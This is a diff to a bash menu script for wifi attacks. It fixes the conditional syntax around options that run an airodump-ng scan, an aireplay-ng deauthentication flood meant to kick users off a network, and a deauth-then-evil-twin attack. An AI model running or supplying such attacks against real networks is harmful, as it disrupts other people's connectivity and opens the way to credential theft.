@@ -44,8 +44,8 @@ read ATTACKTY
 if [[ $ATTACKTY == '1' ]]
 then
     sudo airodump-ng $INTER
-
-elif [[ $ATTACKTY == '2' ]]
+fi
+if [[ $ATTACKTY == '2' ]]
 then
     echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
     sleep 3
@@ -58,7 +58,7 @@ then
 fi
     
 
-elif [[ $ATTACKTY == '3']]
+if [[ $ATTACKTY == '3' ]]
 then
     echo "This will launch a Deauthentication attack which will kick users out of a wifi network"
     sleep 1
@@ -68,11 +68,11 @@ then
     read BSSID3
     sudo aireplay-ng --deauth 1000 -a $BSSID3 $INTER
 fi
-elif [[ $ATTACKTY == '4']]
+if [[ $ATTACKTY == '4' ]]
 then  
     echo "This is still under construction, sorry!"
 fi
-elif [[ $ATTACKTY == '5']]
+if [[ $ATTACKTY == '5' ]]
 then
     echo "This will launch a Deauth attack, then create an Evil Twin of a wifi"
     echo "A scan will be intiated, press CTRL+C to stop it once you found the target"
@@ -91,10 +91,4 @@ fi
 
 
 
-
-
-else
-    echo "bruh"
-
-fi
 
